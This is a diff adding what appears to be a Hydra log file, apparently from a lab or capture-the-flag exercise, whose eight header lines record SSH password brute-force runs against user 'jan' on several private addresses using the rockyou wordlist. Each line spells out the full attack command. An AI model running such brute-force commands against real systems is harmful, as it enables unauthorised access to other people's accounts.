@@ -1,0 +1,8 @@
+# Hydra v9.7 run at 2026-10-01 21:17:30 on 10.65.146.167 ssh (hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 4 -f -o bitacora/hydra_ssh.txt 10.65.146.167 ssh)
+# Hydra v9.7 run at 2026-10-01 21:23:17 on 10.65.146.167 ssh (hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 1 -w 5 -f -o bitacora/hydra_ssh.txt 10.65.146.167 ssh)
+# Hydra v9.7 run at 2026-10-01 21:37:11 on 10.65.146.167 ssh (hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 1 -w 5 -f -o bitacora/hydra_ssh.txt 10.65.146.167 ssh)
+# Hydra v9.7 run at 2026-10-01 21:38:59 on 10.65.146.167 ssh (hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 1 -w 5 -f -o bitacora/hydra_ssh.txt 10.65.146.167 ssh)
+# Hydra v9.7 run at 2026-10-01 22:24:11 on 10.65.146.167 ssh (hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 4 -f -o bitacora/hydra_ssh.txt 10.65.146.167 ssh)
+# Hydra v9.7 run at 2026-10-01 22:25:32 on 10.65.146.167 ssh (hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 4 -f -o bitacora/hydra_ssh.txt 10.65.146.167 ssh)
+# Hydra v9.7 run at 2026-10-01 22:57:57 on 10.65.150.124 ssh (hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 4 -f -o bitacora/hydra_ssh.txt 10.65.150.124 ssh)
+# Hydra v9.7 run at 2026-10-01 23:34:42 on 10.65.143.150 ssh (hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 1 -w 5 -f -o bitacora/hydra_ssh.txt 10.65.143.150 ssh)
